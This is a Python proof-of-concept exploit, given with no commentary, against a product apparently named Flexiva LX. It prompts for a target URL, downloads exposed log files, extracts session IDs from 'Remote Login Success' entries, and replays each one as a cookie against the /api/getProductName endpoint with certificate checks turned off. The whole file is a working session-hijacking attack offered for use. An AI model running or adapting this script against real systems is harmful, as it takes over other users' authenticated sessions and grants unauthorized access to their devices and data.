import requests
import re

# Corrected list of paths
dirs = [
    "/log/Flexiva LX.log.",
    "/log/Flexiva%20LX.log",
    "/log/Flexiva%20LX.log.2"
]

base_url = str(input("Enter the target url : "))

# Regex to find SIDs
sid_pattern = re.compile(r"Remote Login Success.*?sid:\s*(\d+)")
unique_sids = set()

# Headers for initial log file fetch
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

for dir_path in dirs:
    url = base_url + dir_path
    print(f"[*] Checking: {url}")
    try:
        response = requests.get(url, headers=headers, allow_redirects=True, verify=False)
        print(f"[+] Status: {response.status_code}")
        if response.status_code == 200:
            matches = sid_pattern.findall(response.text)
            for sid in matches:
                if sid not in unique_sids:
                    unique_sids.add(sid)
                    print(f"[!] SID found: {sid}")

                    # Now try getProductName API with this SID
                    api_url = base_url + "/api/getProductName"
                    api_headers = {
                        "User-Agent": headers["User-Agent"],
                        "Cookie": f"sid={sid}"
                    }
                    api_response = requests.get(api_url, headers=api_headers, verify=False)
                    print(f"[+] API /getProductName Response (sid={sid}): {api_response.status_code}")
                    print(api_response.text)
            break
        else:
            print("[x] Not Found")
    except requests.RequestException as e:
        print(f"[!] Error: {e}")
